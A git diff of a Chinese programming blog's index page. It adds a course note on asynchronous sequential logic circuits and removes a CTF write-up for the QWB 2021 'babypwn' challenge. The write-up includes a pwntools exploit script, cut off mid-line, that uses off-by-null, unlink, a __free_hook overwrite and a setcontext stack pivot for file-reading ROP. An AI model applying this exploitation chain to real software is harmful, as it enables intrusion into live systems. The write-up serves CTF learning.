@@ -150,6 +150,154 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-6%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-6%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/" class="post-title-link" itemprop="url">数字逻辑 Chapter 6——异步时序逻辑电路</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-28 23:12:35" itemprop="dateCreated datePublished" datetime="2023-02-28T23:12:35+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-01 11:31:49" itemprop="dateModified" datetime="2023-03-01T11:31:49+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/" itemprop="url" rel="index"><span itemprop="name">数字逻辑</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>989</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="61-特点与分类"><a class="markdownIt-Anchor" href="#61-特点与分类"></a> 6.1 特点与分类</h1>
+<p>特点：电路中没有统一的同步时钟脉冲信号，电路状态的改变是外部输入信号变化直接作用的结果。<br />
+分类：根据电路结构和输入信号方式可以分为脉冲异步和电平异步；根据输出与输入的关系分为Moore和Mealy。</p>
+<h1 id="62-脉冲异步时序逻辑电路"><a class="markdownIt-Anchor" href="#62-脉冲异步时序逻辑电路"></a> 6.2 脉冲异步时序逻辑电路</h1>
+<h2 id="621-结构模型"><a class="markdownIt-Anchor" href="#621-结构模型"></a> 6.2.1 结构模型</h2>
+<p>对输入信号的要求：</p>
+<ul>
+<li>输入信号为脉冲信号</li>
+<li>输入脉冲的宽度必须保证触发器可靠翻转</li>
+<li>输入脉冲的间隔，必须保证前一个脉冲引起的电路响应完全结束后，后一个脉冲才能到来</li>
+<li><font color=red>不允许在两个或两个以上的输入端同时出现脉冲（必然有极短的时间差），因此在绘制真值表、状态表时需要注意，如果有多个信号输入，每一种情况只能有一个信号取值为1，其余全为0，减少了很多情况的讨论。也因此，异步时序的状态表有所不同，其次态的每一分栏均为其中一个变量取值为1，而不是三个变量的联合取值</font></li>
+</ul>
+<p>输出信号的形式：</p>
+<ul>
+<li>若电路结构为Mealy型，则输出为脉冲型</li>
+<li>若电路结构为Moore型，则输出为电平型</li>
+</ul>
+<p>两种电路相同点：</p>
+<ul>
+<li>状态的改变都依赖于外加脉冲</li>
+<li>存储元件均为触发器</li>
+</ul>
+<p>两种电路不同点：</p>
+<ul>
+<li>脉冲异步无外加的统一时钟脉冲</li>
+<li>输入变量x为脉冲信号，由输入脉冲直接引起电路状态改变</li>
+<li>由次态逻辑产生各触发器控制输入信号（Y1,Y2,…,Yr），而且还产生触发器的时钟控制信号（CLK1,CLK2,…,CLKr）</li>
+</ul>
+<h2 id="622-脉冲异步时序逻辑分析"><a class="markdownIt-Anchor" href="#622-脉冲异步时序逻辑分析"></a> 6.2.2 脉冲异步时序逻辑分析</h2>
+<p>分析方法：与同步时序大致相同，同样采用状态表、状态图、时间图作为工具<br />
+注意：</p>
+<ul>
+<li>当存储元件采用钟控触发器时，对触发器的时钟控制端应该作为激励函数处理（仅当时钟端有脉冲作用时，才会根据和触发器的输入确定状态转移方向，否则触发器状态不变）</li>
+<li>根据对输入的约束，分析时可以排除两个或两个以上输入端同时出现脉冲以及输入端无脉冲出现情况</li>
+</ul>
+<p>分析步骤：</p>
+<ul>
+<li>写出电路的输出函数和激励函数表达式</li>
+<li>列出电路次态真值表或次态方程组</li>
+<li>作出状态表和状态图</li>
+<li>用文字描述电路的逻辑功能（必要时画出时间图）</li>
+</ul>
+<p>注意：<br />
+在脉冲异步的次态真值表中，↓表示下跳，即仅当时钟端有↓出现时，相应触发器状态才能有所变化，否则状态不变</p>
+<h1 id="63-脉冲异步时序逻辑电路的设计"><a class="markdownIt-Anchor" href="#63-脉冲异步时序逻辑电路的设计"></a> 6.3 脉冲异步时序逻辑电路的设计</h1>
+<p>设计步骤与同步时序相同：</p>
+<ul>
+<li>形成原始状态图和原始状态表</li>
+<li>状态化简，求出最小状态表</li>
+<li>状态编码，得到二进制状态表</li>
+<li>选定触发器类型，并求出激励函数和输出函数最简表达式</li>
+<li>画出逻辑电路图</li>
+</ul>
+<p>下面是带有时钟信号的钟控触发器激励表<br />
+<img src="1.png" alt="" /><br />
+在设计时对于状态表中与时钟端有关的变量，需要标明上升沿或下降沿以明确接线，如下图。<br />
+<img src="2.png" alt="" /></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-5%E2%80%94%E2%80%94%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1811,113 +1959,6 @@ show与edit相同，也是只能展示前30字节。</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/" class="post-title-link" itemprop="url">强网杯2021 pwn 赛题解析——babypwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-28 23:02:06" itemprop="dateCreated datePublished" datetime="2023-02-28T23:02:06+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-01 11:31:37" itemprop="dateModified" datetime="2023-03-01T11:31:37+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这道题增加了沙箱机制，通过seccomp-tools可以轻松获取沙箱的具体内容。</p>
-<p><img src="1.png" alt="" /><br />
-其中的重点就是禁用了execve系统调用，无法直接通过one_gadget、system等直接getshell。这种情况下最为常用的利用方式就是set_context函数，具体如何利用，往下看。</p>
-<p>本题的逆向分析很简单，注意bss中结构体的识别：前8字节是地址，后8字节是大小。在show函数中发现了一个简单的加密函数：</p>
-<p><img src="2.png" alt="" /><br />
-其每一轮的计算如下图所示，红色部分是因为溢出而无法计算的部分，每一轮的计算结果就相当于是所有黄色部分对应位异或的结果。<br />
-<img src="3.png" alt="" /><br />
-那么这个函数应该如何解密呢？观察到每一轮的计算又可以分为3小轮，最后一轮是某个值与自身左移13位的异或。第二轮是另外一个值与自身右移17位的异或得到第三轮的初始值。第一轮是输入与输入自身左移5位的异或得到第二轮的初始值。如此设计解密算法也就不难了，相信了解一些算法的读者都能编写脚本。解密函数如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>
-<p>通过show函数，我们能够获取到堆块的地址。不过需要注意的是，show函数加密的并非堆块自身的地址，而是堆块前8字节的值。通过调试我们可以发现，在程序初始化时调用的seccomp系列函数会申请一些堆块，我们通过申请到这些堆块有可能使得堆块的前8字节是一个堆块地址，以此来获取堆区地址。</p>
-<p>本题的libc环境是2.27版本，有机会改写钩子到setcontext函数【<strong>插一句：在笔者的2.31版本libc中，setcontext函数的栈迁移指令从<code>mov rsp, [rdi+0xA0]</code>被改成了<code>mov rsp,[rdx+0xA0]</code>，这使得本题在2.31环境下无法利用，因为在执行到这里的时候无法控制rdx的值</strong>】。自然而然地，我们容易想到使用unlink堆块重叠的利用方式。在chunk中写一个假chunk，在假chunk的prev_size写入这个chunk的地址，然后将fd和bk指针写到合适的位置，就能够触发unlink。和同年的easy_diary相比，利用难度还更低些。</p>
-<p><img src="4.png" alt="" /><br />
-这里需要注意一下edit函数中的一个看似奇怪的函数。这个函数在read之后调用，会将第一个出现的’\x11’字符替换为0x0。乍一看，这个字符并不是字符串的结束符，但转念一想，不难发现这是出题人在为我们创造off by null的条件：'\x11’很有可能是某个chunk的size的最低1字节。可以通过这个特性修改chunk的大小和prev_inuse位。由于chunk的大小被修改了，因此在这个chunk的最后面还需要写上一个有效的size值，最低位为1，以绕过检查。</p>
-<p>在成功unlink之后，就可以利用堆块重叠修改tcache chunk的fd指针到__free_hook。将其改写到setcontext内部即可实现栈迁移。然后构造好ROP链，打开文件、读文件、写数据。在笔者的机器上，通过调试将rdx改为与rdi的值相等实现栈迁移，但不知何故打开flag文件总是失败。</p>
-<p>exp:（基于20.04，且需要调试修改rdx的值）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;../../../../ld/ld-2.27.so&#x27;, &#x27;./babypwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    lodword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    lodword = decrypt(lodword)</span><br><span class="line">    hidword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    hidword = decrypt(hidword)</span><br><span class="line">    <span class="keyword">return</span> lodword + (hidword &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)                            <span class="comment"># chunk 0, used for leaking address</span></span><br><span class="line">chunk0_addr = show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># chunk #2~8</span></span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk1_addr + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(chunk1_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(chunk1_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)                           <span class="comment"># chunk #9</span></span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #10</span></span><br><span class="line">add(<span class="number">0x20</span>)                           <span class="comment"># chunk #11, goalkeeper</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x28</span>))               <span class="comment"># this can change the chunk #9&#x27;s size from 0x511 to 0x500</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x20</span>) + p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>))        <span class="comment"># write correct prev_size</span></span><br><span class="line">edit(<span class="number">10</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">8</span> - i)                   <span class="comment"># delete chunk #2~8</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># recover chunk #1, 2</span></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># recover chunk #3</span></span><br><span class="line">main_arena = show(<span class="number">3</span>) - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">openfile = base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readfile = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writefile = base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">poprdi_ret = base + <span class="number">0x23B6A</span></span><br><span class="line">poprsi_ret = base + <span class="number">0x2601F</span></span><br><span class="line">poprdx_ret = base + <span class="number">0x142C92</span></span><br><span class="line">addrsp0x18_ret = base + <span class="number">0x349ea</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #5</span></span><br><span class="line">edit(<span class="number">5</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(__free_hook))</span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #6</span></span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #7, to __free_hook</span></span><br><span class="line">edit(<span class="number">7</span>, p64(setcontext + <span class="number">0x3D</span>))     <span class="comment"># change __free_hook to setcontext + 0x3D, ready for stack pivoting</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + 